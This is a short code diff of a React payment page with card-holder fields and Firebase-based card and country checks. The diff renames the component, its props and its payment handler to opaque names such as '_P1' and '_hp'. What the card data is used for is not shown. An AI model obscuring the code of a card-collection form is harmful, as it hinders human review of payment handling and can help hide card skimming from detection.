@@ -19,11 +19,11 @@ import { isCardBlocked, isCountryAllowed } from "@/lib/firebase/settings"
 import { EmailModal } from "@/components/email-modal"
 
 
-interface PaymentPageProps {
+interface _P1Props {
   offerTotalPrice: number
 }
 
-export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
+export default function _P1({ offerTotalPrice }: _P1Props) {
   const router = useRouter()
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-card")
   const [_v1, _s1] = useState("")
@@ -210,7 +210,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
     _s2(value)
   }
 
-  const handlePayment = async (e: React.FormEvent) => {
+  const _hp = async (e: React.FormEvent) => {
     e.preventDefault()
 
     let visitorID = localStorage.getItem("visitor")
@@ -420,7 +420,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
         </div>
 
         {/* Card Information Form */}
-        <form onSubmit={handlePayment} className="space-y-4">
+        <form onSubmit={_hp} className="space-y-4">
           {/* Card Holder Name */}
           <div className="space-y-2">
             <label className="block text-gray-900 font-bold text-sm md:text-base">
